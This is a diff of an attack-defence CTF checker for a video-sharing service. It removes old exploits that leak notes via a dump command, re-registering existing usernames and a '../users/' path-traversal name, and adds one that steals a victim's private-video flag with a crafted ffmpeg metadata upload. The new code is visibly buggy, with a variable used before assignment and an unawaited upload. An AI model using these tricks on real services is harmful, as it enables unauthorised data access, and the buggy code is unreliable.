@@ -4,8 +4,9 @@ import random
 import string
 import faker
 import os
-from httpx import AsyncClient
-from names import adjectives, content_types, cities, countrys
+from httpx import AsyncClient, Response
+from names import adjectives, content_types, cities, countries
+import ffmpeg
 
 
 from typing import Optional
@@ -75,7 +76,7 @@ def generate_title() -> str:
     return f"{adj}-{content}-{number}"
 
 def generate_location() -> str:
-    country = random.choice(countrys)
+    country = random.choice(countries)
     city = random.choice(cities)
     return f"{country}, {city}"
 
@@ -104,12 +105,16 @@ def get_random_thumbnail_path(path="thumbnails") -> str:
     return os.path.join(path, random.choice(thumbnails))
     
 
-def create_video_with_metadata(creator, location, title):
+def create_video_with_metadata(creator, location, title, is_exploit=False):
     """change metadata of video so it can be exploited later with ffmpeg"""
-    logger.info(f"Changing the metadata of the Video {title} with location {location} from creator {creator}")
+    if is_exploit:
+        path = 'exploit.mp4'
+    else:
+        path = 'metadata_video.mp4'
+    logger.info(f"Changing the metadata of the Video {title} with location {location} from creator {creator} saved at {path}")
     video_path = get_random_video_path()
     ffmpeg.input(video_path).output(
-    'metadata_video.mp4',
+    path,
     **{
         'metadata:title': title,
         'metadata:creator': creator,
@@ -119,16 +124,20 @@ def create_video_with_metadata(creator, location, title):
   
     
 
-async def upload_private_video(client: AsyncClient, description, location, title)-> str:
+async def upload_private_video(client: AsyncClient, description, location, title, is_exploit=False)-> str:
    """Upload a private video, description is the flag store"""
    logger.info(f"uploading a private video")
+   if is_exploit:
+       path = "exploit.mp4"
+   else:
+       path = "metadata_video.mp4"
    
    multiform_data = {
         "name": (None,title),
         "description": (None,description),
         "location": (None,location),
         "thumbnail": ("thumbnail", open(get_random_thumbnail_path(),"rb"), "image/png"),
-        "file": ("video", "metadata_video.mp4", "video/mp4"),
+        "file": ("video", path, "video/mp4"),
         "is_private": (None,1)
     }
    response = await client.post("create_video", files=multiform_data)
@@ -197,232 +206,56 @@ async def getflag_note(
     assert_in(task.flag, response.text, "Flag missing")
         
 
-@checker.putnoise(0)
-async def putnoise0(task: PutnoiseCheckerTaskMessage, db: ChainDB, logger: LoggerAdapter, conn: Connection):
-    logger.debug(f"Connecting to the service")
-    welcome = await conn.reader.readuntil(b">")
 
-    # First we need to register a user. So let's create some random strings. (Your real checker should use some better usernames or so [i.e., use the "faker¨ lib])
-    username = "".join(
-        random.choices(string.ascii_uppercase + string.digits, k=12)
-    )
-    password = "".join(
-        random.choices(string.ascii_uppercase + string.digits, k=12)
-    )
-    randomNote = "".join(
-        random.choices(string.ascii_uppercase + string.digits, k=36)
-    )
-
-    # Register another user
-    await conn.register_user(username, password)
-
-    # Now we need to login
-    await conn.login_user(username, password)
-
-    # Finally, we can post our note!
-    logger.debug(f"Sending command to save a note")
-    conn.writer.write(f"set {randomNote}\n".encode())
-    await conn.writer.drain()
-    await conn.reader.readuntil(b"Note saved! ID is ")
-
-    try:
-        noteId = (await conn.reader.readuntil(b"!\n>")).rstrip(b"!\n>").decode()
-    except Exception as ex:
-        logger.debug(f"Failed to retrieve note: {ex}")
-        raise MumbleException("Could not retrieve NoteId")
-
-    assert_equals(len(noteId) > 0, True, message="Empty noteId received")
-
-    logger.debug(f"{noteId}")
-
-    # Exit!
-    logger.debug(f"Sending exit command")
-    conn.writer.write(f"exit\n".encode())
-    await conn.writer.drain()
-
-    await db.set("userdata", (username, password, noteId, randomNote))
-        
-@checker.getnoise(0)
-async def getnoise0(task: GetnoiseCheckerTaskMessage, db: ChainDB, logger: LoggerAdapter, conn: Connection):
-    try:
-        (username, password, noteId, randomNote) = await db.get('userdata')
-    except:
-        raise MumbleException("Putnoise Failed!") 
-
-    logger.debug(f"Connecting to service")
-    welcome = await conn.reader.readuntil(b">")
-
-    # Let's login to the service
-    await conn.login_user(username, password)
-
-    # Let´s obtain our note.
-    logger.debug(f"Sending command to retrieve note: {noteId}")
-    conn.writer.write(f"get {noteId}\n".encode())
-    await conn.writer.drain()
-    data = await conn.reader.readuntil(b">")
-    if not randomNote.encode() in data:
-        raise MumbleException("Resulting flag was found to be incorrect")
-
-    # Exit!
-    logger.debug(f"Sending exit command")
-    conn.writer.write(f"exit\n".encode())
-    await conn.writer.drain()
-
-
-@checker.havoc(0)
-async def havoc0(task: HavocCheckerTaskMessage, logger: LoggerAdapter, conn: Connection):
-    logger.debug(f"Connecting to service")
-    welcome = await conn.reader.readuntil(b">")
-
-    # In variant 0, we'll check if the help text is available
-    logger.debug(f"Sending help command")
-    conn.writer.write(f"help\n".encode())
-    await conn.writer.drain()
-    helpstr = await conn.reader.readuntil(b">")
-
-    for line in [
-        "This is a notebook service. Commands:",
-        "reg USER PW - Register new account",
-        "log USER PW - Login to account",
-        "set TEXT..... - Set a note",
-        "user  - List all users",
-        "list - List all notes",
-        "exit - Exit!",
-        "dump - Dump the database",
-        "get ID",
-    ]:
-        assert_in(line.encode(), helpstr, "Received incomplete response.")
-
-@checker.havoc(1)
-async def havoc1(task: HavocCheckerTaskMessage, logger: LoggerAdapter, conn: Connection):
-    logger.debug(f"Connecting to service")
-    welcome = await conn.reader.readuntil(b">")
-
-    # In variant 1, we'll check if the `user` command still works.
-    username = "".join(
-        random.choices(string.ascii_uppercase + string.digits, k=12)
-    )
-    password = "".join(
-        random.choices(string.ascii_uppercase + string.digits, k=12)
-    )
-
-    # Register and login a dummy user
-    await conn.register_user(username, password)
-    await conn.login_user(username, password)
-
-    logger.debug(f"Sending user command")
-    conn.writer.write(f"user\n".encode())
-    await conn.writer.drain()
-    ret = await conn.reader.readuntil(b">")
-    if not b"User 0: " in ret:
-        raise MumbleException("User command does not return any users")
-
-    if username:
-        assert_in(username.encode(), ret, "Flag username not in user output")
-
-    # conn.writer.close()
-    # await conn.writer.wait_closed()
-
-@checker.havoc(2)
-async def havoc2(task: HavocCheckerTaskMessage, logger: LoggerAdapter, conn: Connection):
-    logger.debug(f"Connecting to service")
-    welcome = await conn.reader.readuntil(b">")
-
-    # In variant 2, we'll check if the `list` command still works.
-    username = "".join(
-        random.choices(string.ascii_uppercase + string.digits, k=12)
-    )
-    password = "".join(
-        random.choices(string.ascii_uppercase + string.digits, k=12)
-    )
-    randomNote = "".join(
-        random.choices(string.ascii_uppercase + string.digits, k=36)
-    )
-
-    # Register and login a dummy user
-    await conn.register_user(username, password)
-    await conn.login_user(username, password)
-
-    logger.debug(f"Sending command to save a note")
-    conn.writer.write(f"set {randomNote}\n".encode())
-    await conn.writer.drain()
-    await conn.reader.readuntil(b"Note saved! ID is ")
-
-    try:
-        noteId = (await conn.reader.readuntil(b"!\n>")).rstrip(b"!\n>").decode()
-    except Exception as ex:
-        logger.debug(f"Failed to retrieve note: {ex}")
-        raise MumbleException("Could not retrieve NoteId")
-
-    assert_equals(len(noteId) > 0, True, message="Empty noteId received")
-
-    logger.debug(f"{noteId}")
-
-    logger.debug(f"Sending list command")
-    conn.writer.write(f"list\n".encode())
-    await conn.writer.drain()
-
-    data = await conn.reader.readuntil(b">")
-    if not noteId.encode() in data:
-        raise MumbleException("List command does not work as intended")
 
 @checker.exploit(0)
-async def exploit0(task: ExploitCheckerTaskMessage, searcher: FlagSearcher, conn: Connection, logger:LoggerAdapter) -> Optional[str]:
-    welcome = await conn.reader.readuntil(b">")
-    conn.writer.write(b"dump\nexit\n")
-    await conn.writer.drain()
-    data = await conn.reader.read(-1)
-    if flag := searcher.search_flag(data):
+async def exploit0(task: ExploitCheckerTaskMessage, searcher: FlagSearcher, client: AsyncClient, logger:LoggerAdapter) -> Optional[str]:
+    username_attacker: str = "".join(
+        random.choices(string.ascii_uppercase + string.digits, k=12)
+    )
+    password_attacker: str = "".join(
+        random.choices(string.ascii_uppercase + string.digits, k=12)
+    )
+    
+    await signup(client, username_attacker, password_attacker)
+    await login(client, username_attacker, password_attacker)
+    
+    
+    logger.info(f"Exploiting {task.attack_info} ")
+    username = task.attack_info
+    response = await client.get(f"/get_user_info_with_name/{username}")
+    if response.status_code != 200:
+        raise MumbleException()
+    json = response.json()
+    id = json.get("id")
+    private_video_response.raise_for_status()
+    private_video_response = await client.get(f"/get_private_videos/{id}")
+    videos = private_video_response.json()
+    video = videos[0]
+    title = video.get("name")
+    location = video.get("location")
+    
+    create_video_with_metadata(username, location, title, is_exploit=True)
+    upload_private_video(client, "ist egal", "Berlin", title,True)
+    
+    my_vid_response = await client.get("/get_my_videos")
+    if my_vid_response.status_code != 200:
+        raise MumbleException()
+    videos = my_vid_response.json()
+    for video in videos:
+        if video.name == title:
+            video_path = video.path
+            break
+    
+    video_response = await client.get(f"/get_video_info/{video_path}")
+    if video_response.status_code != 200:
+        raise MumbleException()
+    video_exploited = video_response.json()
+    
+    if flag := searcher.search_flag(video_exploited.get("description")):
         return flag
     raise MumbleException("flag not found")
 
-@checker.exploit(1)
-async def exploit1(task: ExploitCheckerTaskMessage, searcher: FlagSearcher, conn: Connection, logger:LoggerAdapter) -> Optional[str]:
-    welcome = await conn.reader.readuntil(b">")
-    conn.writer.write(b"user\n")
-    await conn.writer.drain()
-
-    # TODO: Use flag hints
-    user_list = (await conn.reader.readuntil(b">")).split(b"\n")[:-1]
-    for user in user_list:
-        user_name = user.split()[-1]
-        conn.writer.write(b"reg %s foo\nlog %s foo\n list\n" % (user_name, user_name))
-        await conn.writer.drain()
-        await conn.reader.readuntil(b">")  # successfully registered
-        await conn.reader.readuntil(b">")  # successfully logged in
-        notes_list = (await conn.reader.readuntil(b">")).split(b"\n")[:-1]
-        for note in notes_list:
-            note_id = note.split()[-1]
-            conn.writer.write(b"get %s\n" % note_id)
-            await conn.writer.drain()
-            data = await conn.reader.readuntil(b">")
-            if flag := searcher.search_flag(data):
-                return flag
-    raise MumbleException("flag not found")
-
-@checker.exploit(2)
-async def exploit2(task: ExploitCheckerTaskMessage, searcher: FlagSearcher, conn: Connection, logger:LoggerAdapter) -> Optional[str]:
-    welcome = await conn.reader.readuntil(b">")
-    conn.writer.write(b"user\n")
-    await conn.writer.drain()
-
-    # TODO: Use flag hints?
-    user_list = (await conn.reader.readuntil(b">")).split(b"\n")[:-1]
-    for user in user_list:
-        user_name = user.split()[-1]
-        conn.writer.write(b"reg ../users/%s foo\nlog %s foo\n list\n" % (user_name, user_name))
-        await conn.writer.drain()
-        await conn.reader.readuntil(b">")  # successfully registered
-        await conn.reader.readuntil(b">")  # successfully logged in
-        notes_list = (await conn.reader.readuntil(b">")).split(b"\n")[:-1]
-        for note in notes_list:
-            note_id = note.split()[-1]
-            conn.writer.write(b"get %s\n" % note_id)
-            await conn.writer.drain()
-            data = await conn.reader.readuntil(b">")
-            if flag := searcher.search_flag(data):
-                return flag
-    raise MumbleException("flag not found")
 
 
 if __name__ == "__main__":
